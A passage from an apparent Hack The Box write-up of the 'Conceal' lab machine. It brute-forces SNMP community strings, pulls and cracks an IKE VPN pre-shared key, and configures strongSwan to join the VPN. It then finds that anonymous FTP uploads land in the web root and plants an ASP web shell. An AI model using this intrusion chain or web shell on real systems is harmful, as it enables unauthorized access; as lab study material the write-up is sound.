</span></span></span><span class=line><span class=cl><span class=se></span>SF:x0e<span class=se>\x</span>95E/<span class=se>\r\0\0\x</span>14<span class=se>\x</span>90<span class=se>\x</span>cb<span class=se>\x</span>80<span class=se>\x</span>91&gt;<span class=se>\x</span>bbin<span class=se>\x</span>08c<span class=se>\x</span>81<span class=se>\x</span>b5<span class=se>\x</span>ecB<span class=o>{</span><span class=se>\x</span>1f<span class=se>\r\0\0</span>
</span></span><span class=line><span class=cl>SF:<span class=se>\x</span>14@H<span class=se>\x</span>b7<span class=se>\x</span>d5n<span class=se>\x</span>bc<span class=se>\x</span>e8<span class=se>\x</span>85%<span class=se>\x</span>e7<span class=se>\x</span>de<span class=se>\x</span>7f<span class=se>\0\x</span>d6<span class=se>\x</span>c2<span class=se>\x</span>d3<span class=se>\r\0\0\x</span>14<span class=se>\x</span>fb<span class=se>\x</span><span class=m>1</span>
</span></span><span class=line><span class=cl>SF:d<span class=se>\x</span>e3<span class=se>\x</span>cd<span class=se>\x</span>f3A<span class=se>\x</span>b7<span class=se>\x</span>ea<span class=se>\x</span>16<span class=se>\x</span>b7<span class=se>\x</span>e5<span class=se>\x</span>be<span class=se>\x</span>08U<span class=se>\x</span>f1<span class=se>\x</span>20<span class=se>\0\0\0\x</span>14<span class=se>\x</span>e3<span class=se>\x</span>a5<span class=se>\x</span>
</span></span><span class=line><span class=cl>SF:96jv7<span class=se>\x</span>9f<span class=se>\x</span>e7<span class=se>\x</span>07<span class=se>\&#34;\x</span>821<span class=se>\x</span>e5<span class=se>\x</span>ce<span class=se>\x</span>86R<span class=s2>&#34;)%r(IPSEC_START,38,&#34;</span>1<span class=s1>&#39;\xfc\xb08\x
</span></span></span><span class=line><span class=cl><span class=s1>SF:10\x9e\x89\xa3HVa\x1c\xfc-\xd8\x0b\x10\x05\0YW\(c\0\0\x008\0\0\0\x1c\0\
</span></span></span><span class=line><span class=cl><span class=s1>SF:0\0\x01\x01\x10\0\x0e1&#39;</span><span class=se>\x</span>fc<span class=se>\x</span>b08<span class=se>\x</span>10<span class=se>\x</span>9e<span class=se>\x</span>89<span class=se>\x</span>a3HVa<span class=se>\x</span>1c<span class=se>\x</span>fc-<span class=se>\x</span>d8<span class=s2>&#34;);
</span></span></span><span class=line><span class=cl><span class=s2>Service Info: Host: Conceal
</span></span></span></code></pre></div><p>161 is a <strong>snmp</strong> port as we have seen before we can access to a bunch of information about the remote machine and a <strong>IPSEC/IKE VPN</strong> port.</p><h2 id=enumerating-udp>Enumerating UDP<a hidden class=anchor aria-hidden=true href=#enumerating-udp>#</a></h2><p>First I started with enumerating snmp.</p><p><strong>SNMP</strong> is an <strong>Internet Standard protocol</strong> for collecting and organizing information about managed devices on IP networks and for modifying that information to change device behaviour.</p><p>In order to access to that information we need a community string which is a kind of password.</p><p>There is a <a href=https://github.com/SECFORCE/SNMP-Brute/blob/master/snmpbrute.py>github</a> python script calles <strong>snmpbrute.py</strong> with helps to bruteforce <strong>community strings</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 snmpbrute.py -t 10.10.10.116 -p <span class=m>161</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>10.10.10.116 : <span class=m>161</span> 	Version <span class=o>(</span>v1<span class=o>)</span>:	public
</span></span><span class=line><span class=cl>10.10.10.116 : <span class=m>161</span> 	Version <span class=o>(</span>v2c<span class=o>)</span>:	public
</span></span></code></pre></div><p>There are a lot of similar tools as <strong>snmpbrute</strong> but <strong>snmpbrute</strong> gives us v2c <strong>community strings</strong> which normally contain more info.</p><h2 id=exploiting-udp>Exploiting UDP<a hidden class=anchor aria-hidden=true href=#exploiting-udp>#</a></h2><p>Well now we have a valid <strong>community string</strong>, in order to access to the hidden info I am gonna use <strong>snmpbulkwalk</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>snmpbulkwalk -c public -v 2c <span class=nv>$IP</span> &gt; snmpenum
</span></span></code></pre></div><p>I saved the scan output in a file because normally is so long.</p><p>If we check the first lines theres is a <strong>PSK</strong> password for <strong>IKE VPN</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>SNMPv2-MIB::sysContact.0 <span class=o>=</span> STRING: IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43
</span></span></code></pre></div><p>Also we can found some hidden <strong>TCP</strong> ports.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>TCP-MIB::tcpConnectionState.unknown.<span class=s2>&#34;&#34;</span>.21.unknown.<span class=s2>&#34;&#34;</span>.0 <span class=o>=</span> INTEGER: listen<span class=o>(</span>2<span class=o>)</span>
</span></span><span class=line><span class=cl>TCP-MIB::tcpConnectionState.unknown.<span class=s2>&#34;&#34;</span>.80.unknown.<span class=s2>&#34;&#34;</span>.0 <span class=o>=</span> INTEGER: listen<span class=o>(</span>2<span class=o>)</span>
</span></span><span class=line><span class=cl>TCP-MIB::tcpConnectionState.unknown.<span class=s2>&#34;&#34;</span>.445.unknown.<span class=s2>&#34;&#34;</span>.0 <span class=o>=</span> INTEGER: listen<span class=o>(</span>2<span class=o>)</span>
</span></span><span class=line><span class=cl>TCP-MIB::tcpConnectionState.ipv4.<span class=s2>&#34;0.0.0.0&#34;</span>.135.ipv4.<span class=s2>&#34;0.0.0.0&#34;</span>.0 <span class=o>=</span> INTEGER: listen<span class=o>(</span>2<span class=o>)</span>
</span></span><span class=line><span class=cl>TCP-MIB::tcpConnectionState.ipv4.<span class=s2>&#34;0.0.0.0&#34;</span>.49664.ipv4.<span class=s2>&#34;0.0.0.0&#34;</span>.0 <span class=o>=</span> INTEGER: listen<span class=o>(</span>2<span class=o>)</span>
</span></span><span class=line><span class=cl>TCP-MIB::tcpConnectionState.ipv4.<span class=s2>&#34;0.0.0.0&#34;</span>.49665.ipv4.<span class=s2>&#34;0.0.0.0&#34;</span>.0 <span class=o>=</span> INTEGER: listen<span class=o>(</span>2<span class=o>)</span>
</span></span><span class=line><span class=cl>TCP-MIB::tcpConnectionState.ipv4.<span class=s2>&#34;0.0.0.0&#34;</span>.49666.ipv4.<span class=s2>&#34;0.0.0.0&#34;</span>.0 <span class=o>=</span> INTEGER: listen<span class=o>(</span>2<span class=o>)</span>
</span></span><span class=line><span class=cl>TCP-MIB::tcpConnectionState.ipv4.<span class=s2>&#34;0.0.0.0&#34;</span>.49667.ipv4.<span class=s2>&#34;0.0.0.0&#34;</span>.0 <span class=o>=</span> INTEGER: listen<span class=o>(</span>2<span class=o>)</span>
</span></span><span class=line><span class=cl>TCP-MIB::tcpConnectionState.ipv4.<span class=s2>&#34;0.0.0.0&#34;</span>.49668.ipv4.<span class=s2>&#34;0.0.0.0&#34;</span>.0 <span class=o>=</span> INTEGER: listen<span class=o>(</span>2<span class=o>)</span>
</span></span><span class=line><span class=cl>TCP-MIB::tcpConnectionState.ipv4.<span class=s2>&#34;0.0.0.0&#34;</span>.49669.ipv4.<span class=s2>&#34;0.0.0.0&#34;</span>.0 <span class=o>=</span> INTEGER: listen<span class=o>(</span>2<span class=o>)</span>
</span></span><span class=line><span class=cl>TCP-MIB::tcpConnectionState.ipv4.<span class=s2>&#34;0.0.0.0&#34;</span>.49670.ipv4.<span class=s2>&#34;0.0.0.0&#34;</span>.0 <span class=o>=</span> INTEGER: listen<span class=o>(</span>2<span class=o>)</span>
</span></span><span class=line><span class=cl>TCP-MIB::tcpConnectionState.ipv4.<span class=s2>&#34;10.10.10.116&#34;</span>.139.ipv4.<span class=s2>&#34;0.0.0.0&#34;</span>.0 <span class=o>=</span> INTEGER: listen<span class=o>(</span>2<span class=o>)</span>
</span></span></code></pre></div><p>If we return to the <strong>nmap</strong> scan there is other open port with a <strong>IKE VPN</strong>.</p><p>First letâ€™s talk about with what we are dealing now. <strong>IPsec</strong> is the most commonly used technology for <strong>LAN to LAN</strong> and <strong>enterprise VPN.</strong></p><p><strong>IKE is a type of ISAKMP</strong> (Internet Security Association Key Management Protocol) implementation.</p><p>Thanks to a <a href=https://book.hacktricks.xyz/network-services-pentesting/ipsec-ike-vpn-pentesting>Hacktricks</a> post I found a command which helps us to know if there is a <strong>IKE VPN</strong> listening.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ike-scan -M 10.10.10.116
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Starting ike-scan 1.9.5 with <span class=m>1</span> hosts <span class=o>(</span>http://www.nta-monitor.com/tools/ike-scan/<span class=o>)</span>
</span></span><span class=line><span class=cl>10.10.10.116	Main Mode Handshake returned
</span></span><span class=line><span class=cl>	<span class=nv>HDR</span><span class=o>=(</span>CKY-R<span class=o>=</span>478fed0dd59df637<span class=o>)</span>
</span></span><span class=line><span class=cl>	<span class=nv>SA</span><span class=o>=(</span><span class=nv>Enc</span><span class=o>=</span>3DES <span class=nv>Hash</span><span class=o>=</span>SHA1 <span class=nv>Group</span><span class=o>=</span>2:modp1024 <span class=nv>Auth</span><span class=o>=</span>PSK <span class=nv>LifeType</span><span class=o>=</span>Seconds LifeDuration<span class=o>(</span>4<span class=o>)=</span>0x00007080<span class=o>)</span>
</span></span><span class=line><span class=cl>	<span class=nv>VID</span><span class=o>=</span>1e2b516905991c7d7c96fcbfb587e46100000009 <span class=o>(</span>Windows-8<span class=o>)</span>
</span></span><span class=line><span class=cl>	<span class=nv>VID</span><span class=o>=</span>4a131c81070358455c5728f20e95452f <span class=o>(</span>RFC <span class=m>3947</span> NAT-T<span class=o>)</span>
</span></span><span class=line><span class=cl>	<span class=nv>VID</span><span class=o>=</span>90cb80913ebb696e086381b5ec427b1f <span class=o>(</span>draft-ietf-ipsec-nat-t-ike-02<span class=se>\n</span><span class=o>)</span>
</span></span><span class=line><span class=cl>	<span class=nv>VID</span><span class=o>=</span>4048b7d56ebce88525e7de7f00d6c2d3 <span class=o>(</span>IKE Fragmentation<span class=o>)</span>
</span></span><span class=line><span class=cl>	<span class=nv>VID</span><span class=o>=</span>fb1de3cdf341b7ea16b7e5be0855f120 <span class=o>(</span>MS-Negotiation Discovery Capable<span class=o>)</span>
</span></span><span class=line><span class=cl>	<span class=nv>VID</span><span class=o>=</span>e3a5966a76379fe707228231e5ce8652 <span class=o>(</span>IKE CGA version 1<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Ending ike-scan 1.9.5: <span class=m>1</span> hosts scanned in 0.123 seconds <span class=o>(</span>8.11 hosts/sec<span class=o>)</span>.  <span class=m>1</span> returned handshake<span class=p>;</span> <span class=m>0</span> returned notify
</span></span></code></pre></div><p>The output shows what <strong>SA</strong> (security association) is using which <strong>specifies security properties that are recognized by communicating hosts.</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ike-scan -M 10.10.10.116 -2
</span></span></code></pre></div><p>I have run the same command with <strong>ikev2</strong> but failed. That helps us because now we know the ike version which is running is <strong>v1</strong>.</p><p>I tried to run again the same command in aggressive mode but is useless because we already know the hash.</p><p>So we have a <strong>SA</strong>, the version and the password hash, we only need to configure the <strong>VPN</strong> with these parameters in order to connect.</p><p>But before that letâ€™s crack the hash.</p><p>I used <a href=http://hashes.com>hashes.com</a> in order to crack it</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>9c8b1a372b1878851be2c097031b6e43:Dudecake1!
</span></span></code></pre></div><p>A tool called <strong>strongSwan</strong> which helps to connect easily to an <strong>IPSEC VPN</strong>.</p><p>But before connecting we need to configure <code>/etc/ipsec.conf</code> and <code>/etc/ipsec.secrets</code></p><p>After a several try and error, using <code>man ipsec.conf</code> and <code>man ipsec.secrets</code> I achieved a working config file.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># ipsec.secrets - strongSwan IPsec secrets file</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>%any : PSK <span class=s2>&#34;Dudecake1!&#34;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># ipsec.conf - strongSwan IPsec configuration file</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># basic configuration</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>config setup
</span></span><span class=line><span class=cl>	<span class=nv>charondebug</span><span class=o>=</span><span class=s2>&#34;all&#34;</span>
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>conn conceal
</span></span><span class=line><span class=cl>       <span class=nv>authby</span><span class=o>=</span>secret
</span></span><span class=line><span class=cl>       <span class=nv>ike</span><span class=o>=</span>3des-sha1-modp1024!
</span></span><span class=line><span class=cl>       <span class=nv>esp</span><span class=o>=</span>3des-sha1!
</span></span><span class=line><span class=cl>       <span class=nv>type</span><span class=o>=</span>transport
</span></span><span class=line><span class=cl>       <span class=nv>keyexchange</span><span class=o>=</span>ikev1
</span></span><span class=line><span class=cl>       <span class=nv>left</span><span class=o>=</span>10.10.10.116
</span></span><span class=line><span class=cl>       <span class=nv>right</span><span class=o>=</span>10.10.14.9
</span></span><span class=line><span class=cl>       <span class=nv>auto</span><span class=o>=</span>add
</span></span></code></pre></div><p>In <code>ipsec.secrets</code> only we need to add one line for the specifying the password <code>%any : PSK "Dudecake1!"</code></p><p>In <code>ipsec.conf</code> we need to put more stuff, first we need to specify a new connection I have called it conceal, then I specify some values:</p><ul><li><code>authby=secret</code>use <strong>PSK</strong> auth specified on the secrets file.</li><li><code>ike</code>, <code>esp</code>, and <code>keyexchange</code> are set based on information from <code>ike-scan</code>.</li><li><code>left</code> and <code>right</code> are for the local and remote <strong>IP address</strong>.</li><li><code>type=transport</code> - use transport mode.(This parameter was a guess).</li><li><code>auto=add</code> was a guess too.</li></ul><p>Also I have changed some parameters for the setup configurations like (but there are optional):</p><ul><li><code>charondebug="all"</code> - be more verbose to help me troubleshoot the connection.</li></ul><p>Now letâ€™s start the service to connect to the <strong>VPN</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo ipsec start
</span></span><span class=line><span class=cl>sudo ipsec up conceal
</span></span></code></pre></div><p>Once executed the following error was outputted.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>initiating Main Mode IKE_SA conceal<span class=o>[</span>1<span class=o>]</span> to 10.10.10.116
</span></span><span class=line><span class=cl>generating ID_PROT request <span class=m>0</span> <span class=o>[</span> SA V V V V V <span class=o>]</span>
</span></span><span class=line><span class=cl>sending packet: from 10.10.14.9<span class=o>[</span>500<span class=o>]</span> to 10.10.10.116<span class=o>[</span>500<span class=o>]</span> <span class=o>(</span><span class=m>176</span> bytes<span class=o>)</span>
</span></span><span class=line><span class=cl>received packet: from 10.10.10.116<span class=o>[</span>500<span class=o>]</span> to 10.10.14.9<span class=o>[</span>500<span class=o>]</span> <span class=o>(</span><span class=m>208</span> bytes<span class=o>)</span>
</span></span><span class=line><span class=cl>parsed ID_PROT response <span class=m>0</span> <span class=o>[</span> SA V V V V V V <span class=o>]</span>
</span></span><span class=line><span class=cl>received MS NT5 ISAKMPOAKLEY vendor ID
</span></span><span class=line><span class=cl>received NAT-T <span class=o>(</span>RFC 3947<span class=o>)</span> vendor ID
</span></span><span class=line><span class=cl>received draft-ietf-ipsec-nat-t-ike-02<span class=se>\n</span> vendor ID
</span></span><span class=line><span class=cl>received FRAGMENTATION vendor ID
</span></span><span class=line><span class=cl>received unknown vendor ID: fb:1d:e3:cd:f3:41:b7:ea:16:b7:e5:be:08:55:f1:20
</span></span><span class=line><span class=cl>received unknown vendor ID: e3:a5:96:6a:76:37:9f:e7:07:22:82:31:e5:ce:86:52
</span></span><span class=line><span class=cl>selected proposal: IKE:3DES_CBC/HMAC_SHA1_96/PRF_HMAC_SHA1/MODP_1024
</span></span><span class=line><span class=cl>generating ID_PROT request <span class=m>0</span> <span class=o>[</span> KE No NAT-D NAT-D <span class=o>]</span>
</span></span><span class=line><span class=cl>sending packet: from 10.10.14.9<span class=o>[</span>500<span class=o>]</span> to 10.10.10.116<span class=o>[</span>500<span class=o>]</span> <span class=o>(</span><span class=m>244</span> bytes<span class=o>)</span>
</span></span><span class=line><span class=cl>received packet: from 10.10.10.116<span class=o>[</span>500<span class=o>]</span> to 10.10.14.9<span class=o>[</span>500<span class=o>]</span> <span class=o>(</span><span class=m>260</span> bytes<span class=o>)</span>
</span></span><span class=line><span class=cl>parsed ID_PROT response <span class=m>0</span> <span class=o>[</span> KE No NAT-D NAT-D <span class=o>]</span>
</span></span><span class=line><span class=cl>generating ID_PROT request <span class=m>0</span> <span class=o>[</span> ID HASH N<span class=o>(</span>INITIAL_CONTACT<span class=o>)</span> <span class=o>]</span>
</span></span><span class=line><span class=cl>sending packet: from 10.10.14.9<span class=o>[</span>500<span class=o>]</span> to 10.10.10.116<span class=o>[</span>500<span class=o>]</span> <span class=o>(</span><span class=m>100</span> bytes<span class=o>)</span>
</span></span><span class=line><span class=cl>received packet: from 10.10.10.116<span class=o>[</span>500<span class=o>]</span> to 10.10.14.9<span class=o>[</span>500<span class=o>]</span> <span class=o>(</span><span class=m>68</span> bytes<span class=o>)</span>
</span></span><span class=line><span class=cl>parsed ID_PROT response <span class=m>0</span> <span class=o>[</span> ID HASH <span class=o>]</span>
</span></span><span class=line><span class=cl>IKE_SA conceal<span class=o>[</span>1<span class=o>]</span> established between 10.10.14.9<span class=o>[</span>10.10.14.9<span class=o>]</span>...10.10.10.116<span class=o>[</span>10.10.10.116<span class=o>]</span>
</span></span><span class=line><span class=cl>scheduling reauthentication in 10238s
</span></span><span class=line><span class=cl>maximum IKE_SA lifetime 10778s
</span></span><span class=line><span class=cl>generating QUICK_MODE request <span class=m>2092714236</span> <span class=o>[</span> HASH SA No ID ID <span class=o>]</span>
</span></span><span class=line><span class=cl>sending packet: from 10.10.14.9<span class=o>[</span>500<span class=o>]</span> to 10.10.10.116<span class=o>[</span>500<span class=o>]</span> <span class=o>(</span><span class=m>164</span> bytes<span class=o>)</span>
</span></span><span class=line><span class=cl>received packet: from 10.10.10.116<span class=o>[</span>500<span class=o>]</span> to 10.10.14.9<span class=o>[</span>500<span class=o>]</span> <span class=o>(</span><span class=m>76</span> bytes<span class=o>)</span>
</span></span><span class=line><span class=cl>parsed INFORMATIONAL_V1 request <span class=m>1438899382</span> <span class=o>[</span> HASH N<span class=o>(</span>INVAL_ID<span class=o>)</span> <span class=o>]</span>
</span></span><span class=line><span class=cl>received INVALID_ID_INFORMATION error notify
</span></span><span class=line><span class=cl>establishing connection <span class=s1>&#39;conceal&#39;</span> failed
</span></span></code></pre></div><p>We have a <code>INVALID_ID_INFORMATION</code> error</p><p>Searching on google I found a <strong>IPSEC VPN</strong> troubleshooting post.</p><p>In the post this type of error is occurring on the phase 2 so as the phase 1 is finished is not a credential error. And the error is exactly a network mismatch.</p><p>Then I realized that the tcp ports arenâ€™t displayed in the <strong>nmap scan</strong> but the <strong>UDP</strong> are so maybe the <strong>VPN</strong> is hiding only the <strong>TCP</strong> ports.</p><p>If we add the parameter <code>leftsubnet=10.10.10.116[tcp]</code> on the connection part of <code>ipsec.conf</code> file, the <strong>VPN</strong> only will running on the <strong>TCP</strong> ports and should work correctly.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>initiating Main Mode IKE_SA conceal<span class=o>[</span>1<span class=o>]</span> to 10.10.10.116
</span></span><span class=line><span class=cl>generating ID_PROT request <span class=m>0</span> <span class=o>[</span> SA V V V V V <span class=o>]</span>
</span></span><span class=line><span class=cl>sending packet: from 10.10.14.9<span class=o>[</span>500<span class=o>]</span> to 10.10.10.116<span class=o>[</span>500<span class=o>]</span> <span class=o>(</span><span class=m>176</span> bytes<span class=o>)</span>
</span></span><span class=line><span class=cl>received packet: from 10.10.10.116<span class=o>[</span>500<span class=o>]</span> to 10.10.14.9<span class=o>[</span>500<span class=o>]</span> <span class=o>(</span><span class=m>208</span> bytes<span class=o>)</span>
</span></span><span class=line><span class=cl>parsed ID_PROT response <span class=m>0</span> <span class=o>[</span> SA V V V V V V <span class=o>]</span>
</span></span><span class=line><span class=cl>received MS NT5 ISAKMPOAKLEY vendor ID
</span></span><span class=line><span class=cl>received NAT-T <span class=o>(</span>RFC 3947<span class=o>)</span> vendor ID
</span></span><span class=line><span class=cl>received draft-ietf-ipsec-nat-t-ike-02<span class=se>\n</span> vendor ID
</span></span><span class=line><span class=cl>received FRAGMENTATION vendor ID
</span></span><span class=line><span class=cl>received unknown vendor ID: fb:1d:e3:cd:f3:41:b7:ea:16:b7:e5:be:08:55:f1:20
</span></span><span class=line><span class=cl>received unknown vendor ID: e3:a5:96:6a:76:37:9f:e7:07:22:82:31:e5:ce:86:52
</span></span><span class=line><span class=cl>selected proposal: IKE:3DES_CBC/HMAC_SHA1_96/PRF_HMAC_SHA1/MODP_1024
</span></span><span class=line><span class=cl>generating ID_PROT request <span class=m>0</span> <span class=o>[</span> KE No NAT-D NAT-D <span class=o>]</span>
</span></span><span class=line><span class=cl>sending packet: from 10.10.14.9<span class=o>[</span>500<span class=o>]</span> to 10.10.10.116<span class=o>[</span>500<span class=o>]</span> <span class=o>(</span><span class=m>244</span> bytes<span class=o>)</span>
</span></span><span class=line><span class=cl>received packet: from 10.10.10.116<span class=o>[</span>500<span class=o>]</span> to 10.10.14.9<span class=o>[</span>500<span class=o>]</span> <span class=o>(</span><span class=m>260</span> bytes<span class=o>)</span>
</span></span><span class=line><span class=cl>parsed ID_PROT response <span class=m>0</span> <span class=o>[</span> KE No NAT-D NAT-D <span class=o>]</span>
</span></span><span class=line><span class=cl>generating ID_PROT request <span class=m>0</span> <span class=o>[</span> ID HASH N<span class=o>(</span>INITIAL_CONTACT<span class=o>)</span> <span class=o>]</span>
</span></span><span class=line><span class=cl>sending packet: from 10.10.14.9<span class=o>[</span>500<span class=o>]</span> to 10.10.10.116<span class=o>[</span>500<span class=o>]</span> <span class=o>(</span><span class=m>100</span> bytes<span class=o>)</span>
</span></span><span class=line><span class=cl>received packet: from 10.10.10.116<span class=o>[</span>500<span class=o>]</span> to 10.10.14.9<span class=o>[</span>500<span class=o>]</span> <span class=o>(</span><span class=m>68</span> bytes<span class=o>)</span>
</span></span><span class=line><span class=cl>parsed ID_PROT response <span class=m>0</span> <span class=o>[</span> ID HASH <span class=o>]</span>
</span></span><span class=line><span class=cl>IKE_SA conceal<span class=o>[</span>1<span class=o>]</span> established between 10.10.14.9<span class=o>[</span>10.10.14.9<span class=o>]</span>...10.10.10.116<span class=o>[</span>10.10.10.116<span class=o>]</span>
</span></span><span class=line><span class=cl>scheduling reauthentication in 9912s
</span></span><span class=line><span class=cl>maximum IKE_SA lifetime 10452s
</span></span><span class=line><span class=cl>generating QUICK_MODE request <span class=m>3169062681</span> <span class=o>[</span> HASH SA No ID ID <span class=o>]</span>
</span></span><span class=line><span class=cl>sending packet: from 10.10.14.9<span class=o>[</span>500<span class=o>]</span> to 10.10.10.116<span class=o>[</span>500<span class=o>]</span> <span class=o>(</span><span class=m>164</span> bytes<span class=o>)</span>
</span></span><span class=line><span class=cl>received packet: from 10.10.10.116<span class=o>[</span>500<span class=o>]</span> to 10.10.14.9<span class=o>[</span>500<span class=o>]</span> <span class=o>(</span><span class=m>188</span> bytes<span class=o>)</span>
</span></span><span class=line><span class=cl>parsed QUICK_MODE response <span class=m>3169062681</span> <span class=o>[</span> HASH SA No ID ID <span class=o>]</span>
</span></span><span class=line><span class=cl>selected proposal: ESP:3DES_CBC/HMAC_SHA1_96/NO_EXT_SEQ
</span></span><span class=line><span class=cl>CHILD_SA conceal<span class=o>{</span>1<span class=o>}</span> established with SPIs c44d2140_i 0c2d93b4_o and TS 10.10.14.9/32 <span class=o>===</span> 10.10.10.116/32<span class=o>[</span>tcp<span class=o>]</span>
</span></span><span class=line><span class=cl>connection <span class=s1>&#39;conceal&#39;</span> established successfully
</span></span></code></pre></div><p>Well we have established successfully the connection.</p><h2 id=enumerating-tcp>Enumerating TCP<a hidden class=anchor aria-hidden=true href=#enumerating-tcp>#</a></h2><p>So letâ€™s retry the <strong>TCP</strong> scan again.</p><p>With a <strong>SYN port scan</strong> nothing is outputted but the <strong>TCP</strong> <strong>scan</strong> worked.</p><p>The scan is taking too long so letâ€™s focus in scan only the ports outputted by <strong>snmp</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nmap <span class=nv>$IP</span> -p21,80,445,133,139 -n -Pn --min-rate<span class=o>=</span><span class=m>5000</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>PORT    STATE SERVICE       VERSION
</span></span><span class=line><span class=cl>21/tcp  open  ftp           Microsoft ftpd
</span></span><span class=line><span class=cl><span class=p>|</span>_ftp-anon: Anonymous FTP login allowed <span class=o>(</span>FTP code 230<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ftp-syst:
</span></span><span class=line><span class=cl><span class=p>|</span>_  SYST: Windows_NT
</span></span><span class=line><span class=cl>80/tcp  open  http          Microsoft IIS httpd 10.0
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: IIS Windows
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Microsoft-IIS/10.0
</span></span><span class=line><span class=cl><span class=p>|</span> http-methods:
</span></span><span class=line><span class=cl><span class=p>|</span>_  Potentially risky methods: TRACE
</span></span><span class=line><span class=cl>135/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl>139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span class=line><span class=cl>445/tcp open  microsoft-ds?
</span></span><span class=line><span class=cl>Service Info: OS: Windows<span class=p>;</span> CPE: cpe:/o:microsoft:windows
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Host script results:
</span></span><span class=line><span class=cl><span class=p>|</span> smb2-time:
</span></span><span class=line><span class=cl><span class=p>|</span>   date: 2023-09-13T15:38:03
</span></span><span class=line><span class=cl><span class=p>|</span>_  start_date: 2023-09-13T15:36:01
</span></span><span class=line><span class=cl><span class=p>|</span> smb2-security-mode:
</span></span><span class=line><span class=cl><span class=p>|</span>   3:1:1:
</span></span><span class=line><span class=cl><span class=p>|</span>_    Message signing enabled but not required
</span></span><span class=line><span class=cl><span class=p>|</span>_clock-skew: -1s
</span></span></code></pre></div><p>As always I am gonna start with the website.</p><p><img alt=Untitled loading=lazy src=/HTB/conceal-1.png></p><p>Is a default IIS 10.0 homepage.</p><p>Letâ€™s do a quick <strong>fuzz</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>gobuster dir -u http://10.10.10.116/ -w ~/Documents/wordlists/KaliLists/dirb/common.txt -x php,html,css,js,py,txt -t <span class=m>100</span> -o fuzz <span class=p>|</span> tee fuzz.save
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>Starting gobuster in directory enumeration <span class=nv>mode</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>/upload               <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 150<span class=o>]</span> <span class=o>[</span>--&gt; http://10.10.10.116/upload/<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl><span class=nv>Finished</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span></code></pre></div><p>Only one directory letâ€™s take a look</p><p><img alt=Untitled loading=lazy src=/HTB/conceal-2.png></p><p><code>/upload</code> seems to be empty.</p><p>At this point I start enumerating the ftp but when I login anonymously I donâ€™t found anything.</p><p><img alt=Untitled loading=lazy src=/HTB/conceal-3.png></p><p>In the uploads directory of the website we donâ€™t find anything as well so I have attempted to upload something to the ftp share in order to know if itâ€™s the same directory.</p><p>So I create a test folder to see if the website list it.</p><p><img alt=Untitled loading=lazy src=/HTB/conceal-4.png></p><p>We can see that uploads list now new content.</p><h2 id=exploiting-tcp>Exploiting TCP<a hidden class=anchor aria-hidden=true href=#exploiting-tcp>#</a></h2><p>Well we can upload files, so as the website is <strong>Windows</strong> maybe is running <strong>ASP.NET</strong> letâ€™s try to upload a <strong>aspx</strong> web shell.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&lt;%
</span></span><span class=line><span class=cl>Set <span class=nv>rs</span> <span class=o>=</span> CreateObject<span class=o>(</span><span class=s2>&#34;WScript.Shell&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>Set <span class=nv>cmd</span> <span class=o>=</span> rs.Exec<span class=o>(</span><span class=s2>&#34;whoami&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>Response.Write<span class=o>(</span>cmd.StdOut.ReadAll<span class=o>)</span>
</span></span><span class=line><span class=cl>%&gt;
